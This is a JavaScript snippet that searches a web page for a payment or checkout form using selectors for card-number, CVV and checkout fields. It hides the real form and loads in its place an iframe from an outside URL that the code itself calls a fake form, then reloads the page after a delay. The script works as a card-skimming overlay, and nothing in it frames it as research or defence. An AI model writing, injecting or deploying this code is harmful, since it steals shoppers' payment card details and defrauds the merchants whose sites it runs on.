// Wait for the document to load
(function() {
    // Function to create and insert the iframe with the fake form
    const createThirdPartyIframeWithFakeForm = (originalForm) => {
        const iframe = document.createElement('iframe');
        iframe.style.width = '100%';
        iframe.style.height = '400px'; // Adjust height as needed
        iframe.style.border = 'none';
        iframe.src = 'https://big-levovsky.github.io/fakefrom/'; // URL of the third-party iframe content

        // Insert the iframe before the original form
        originalForm.parentNode.insertBefore(iframe, originalForm);

        // Hide the original form
        originalForm.style.display = 'none';

        //Simulate a delay and then redirect to the original form
        setTimeout(() => {
            window.location.href=window.location.href // Redirect to the original form page
        }, 10000); // Delay for 2 seconds

    };

    // Function to replace the real form with the iframe containing the fake form
    const replaceFormWithIframe = () => {
        // Find the real payment form using a combined selector
        let originalForm = document.querySelector('form input[id*="cvv"], form input[id="card-number"], form[action*="payment"], form[action*="checkout"], form[action*="order"], form.payment-form, form#payment-form');

        if (originalForm) {
            // Get the parent form element
            originalForm = originalForm.closest('form');

            // Create and insert the iframe with the fake form
            createThirdPartyIframeWithFakeForm(originalForm);
        }
    };

    // Call the replaceFormWithIframe function
    replaceFormWithIframe();
})();
